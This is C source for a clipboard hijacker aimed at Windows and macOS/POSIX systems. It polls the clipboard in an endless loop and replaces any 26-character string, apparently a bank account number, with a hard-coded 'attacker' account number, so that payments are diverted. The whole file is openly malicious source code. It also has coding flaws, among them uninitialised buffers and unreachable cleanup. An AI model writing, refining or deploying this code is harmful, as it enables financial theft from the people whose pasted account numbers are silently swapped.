#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

#define accNumLen 26


//12345678901234567890123456
//11111111111111111111111111


#ifdef _WIN32

#include <Windows.h>
const char* attackersAccountNumber = "12345678901234567890123456";
int cmp(char* text)
{
    if(strlen(text) != accNumLen)
    {
        return -1;
    }
    else
    {
        for(int i=0; i<accNumLen; ++i)
        {
            if(attackersAccountNumber[i] != text[i])
            {
                return 0;
            }
        }
        return 1;
    }
}


char* winReadFromClipboard()
{
    const char* err = "Error occurred!";
    if(OpenClipboard(NULL)) 
    {
        HANDLE hdata = GetClipboardData(CF_TEXT);
        char* text;
        if(hdata != NULL)
        {
            // schowek nie jest pusty
            text = (char *)GlobalLock(hdata);
            GlobalUnlock(hdata);
        }
        CloseClipboard();
        return text;

    }
    else
    {
        return (char *)err;
    }
    
}

void winWriteToClipboard()
{
    if(OpenClipboard(NULL))
    {
        EmptyClipboard();
        HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, accNumLen);
        if(hGlobal != NULL)
        {
            memcpy(GlobalLock(hGlobal), attackersAccountNumber, accNumLen );
            GlobalUnlock(hGlobal);
            SetClipboardData(CF_TEXT, hGlobal);
        }
        CloseClipboard();
    }
}

void winClipboard()
{    
    while(1)
    {
        char* text = winReadFromClipboard();
        if(strlen(text) == accNumLen && cmp(text) == 0)
        {
            winWriteToClipboard();
            // printf("Writing...\n");
        }
        Sleep(5);
    }
}

#endif

#ifdef _POSIX_VERSION

const char attackersAccountNumber[27] = "12345678901234567890123456";

void unixWriteToClipboard()
{
    char sentence[accNumLen];
    char comm[41];
    strcat(comm, "echo ");
    strcat(comm, attackersAccountNumber);
    strcat(comm, " | pbcopy");
    system(comm);
}

int unixReadFromClipboard()
{
    system("pbpaste > temp.txt");
    char victimClipboard[100];
    FILE *file = fopen("temp.txt", "r");
    fgets(victimClipboard, 100, file);
    if(strlen(victimClipboard) == accNumLen)
    {
        return 1;
    }
    else
    {
        return 0;
    }

    fclose(file);
}

void unixClipboard()
{
    while(1)
    {
        int i = unixReadFromClipboard();
        if(i)
        {
            unixWriteToClipboard();
        }
        sleep(2);
    }
}
#endif

int main()
{
    #ifdef _WIN32
        winClipboard();
    #endif
    #ifdef _POSIX_VERSION
        unixClipboard();
    #endif
    return 0;
}
